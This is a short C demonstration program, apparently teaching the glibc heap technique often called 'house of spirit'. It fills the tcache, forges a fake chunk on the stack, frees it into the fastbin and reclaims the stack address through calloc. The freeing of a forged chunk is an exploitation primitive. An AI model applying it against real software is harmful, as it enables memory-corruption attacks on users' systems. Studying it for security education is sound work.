#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	char *p_tcache[20];
	// fill tcache
	for(int i=0;i<7;i++)
		p_tcache[i] = malloc(0x30);
	for(int i=0;i<7;i++)
		free(p_tcache[i]);
	
	// prepare fake chunk	
	long fake_chunk[30];
	long *st = &fake_chunk[0];
	printf("The start of fake chunk @ %p\n",st);
	
	fake_chunk[0] = 0; // prev_size
	fake_chunk[1] = 0x40; // size
	fake_chunk[9] = 0x1234; /* next fake_chunk's size
					0x10< 0x1234 <0x21000
					*/
	long *p = &fake_chunk[2]; // chunk1_mem_addr
	printf("fake_chunk1 @ %p\n",p);
	free(p); // fake_chunk1 into fastbin
	
	// add back
	char *q = calloc(1,0x30); // Otherwise use malloc 8 times.
	printf("Our chunk   @ %p\n",q);
	
	return 0;
}
